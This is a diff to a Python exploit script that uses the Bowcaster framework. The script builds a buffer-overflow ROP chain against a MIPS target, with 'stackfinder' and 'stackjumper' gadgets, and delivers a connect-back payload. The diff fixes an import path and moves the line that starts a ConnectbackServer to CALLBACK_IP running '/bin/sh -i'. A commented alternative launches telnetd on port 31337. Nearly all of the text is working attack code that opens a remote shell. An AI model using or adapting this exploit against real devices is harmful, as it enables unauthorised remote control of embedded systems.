@@ -17,7 +17,7 @@ import socket
 import signal
 import time
 
-from bowcaster.overflow_development.overflowbuilder import *
+from bowcaster.development.overflowbuilder import *
 from bowcaster.common.support import LittleEndian,Logging
 from bowcaster.servers.connectback_server import ConnectbackServer
 from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
@@ -66,8 +66,6 @@ SC.gadget_section(688,0x427a4,description="stackfinder.")
 #stackjumber. jalr $s0
 SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 
-connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
-
 #Or non-interactive exploitation:
 #connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
 
@@ -101,8 +99,8 @@ if len(sys.argv) == 2:
 
 addr=sys.argv[1]
 port=int(sys.argv[2])
-pid=1
 
+connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
 pid=connectback_server.serve()
 time.sleep(1)
 if pid:
